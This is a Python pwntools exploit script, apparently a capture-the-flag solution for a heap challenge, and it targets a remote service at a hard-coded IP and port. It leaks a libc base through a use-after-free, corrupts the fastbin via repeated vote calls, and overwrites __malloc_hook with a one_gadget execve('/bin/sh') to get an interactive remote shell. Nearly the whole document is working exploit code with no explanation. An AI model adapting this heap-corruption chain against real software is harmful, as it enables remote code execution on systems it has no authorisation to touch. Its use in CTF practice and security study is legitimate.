#coding:utf-8

from pwn import *

debug=0
elf = ELF('./4')
if debug:
	p= process('./4')
	context.log_level = 'debug'
	context.terminal = ['terminator','-x','sh','-c']
	libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote("47.92.28.22",30529)
	libc = ELF('./libc.so.6')

def add(size,name):
	p.recvuntil('Action:')
	p.sendline('0')
	p.recvuntil('size')
	p.sendline(str(size))
	p.recvuntil('name:')
	p.send(name)

def show(index):
	p.recvuntil('Action:')
	p.sendline('1')
	p.recvuntil('index')
	p.sendline(str(index))

def vote(index):
	p.recvuntil('Action:')
	p.sendline('2')
	p.recvuntil('index')
	p.sendline(str(index))	

def cancel(index):
	p.recvuntil('Action:')
	p.sendline('4')
	p.recvuntil('index')
	p.sendline(str(index))	

name = '\x44'*0x80
add(0x80,name)  #0
add(0x80,'\x44'*0x80) #1
cancel(0)
show(0)
p.recvuntil('count: ')
libcbase = int(p.recvuntil('\n'),10) - (0x7f68b6a05b78-0x7f68b6641000)
log.success('libcbase = '+hex(libcbase))

add(0x80,'\x44'*0x80) #2
add(0x50,'\x44'*0x50) #3
name = p64(0) + p64(0x71) + p64(libcbase+0x7f0e8c25eb20-0x7f0e8be9a000-0x33) 
add(0x50,name+'\n') #4

cancel(4)
cancel(3)

for i in range(0x20):
	vote(3)

sleep(4)
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]

add(0x50,'\x44'*0x50)
add(0x50,'\x44'*0x50)
add(0x50,'\x00'*3+p64(libcbase+one_gadget[2])+'\n')

cancel(7)
#gdb.attach(p)
p.interactive()
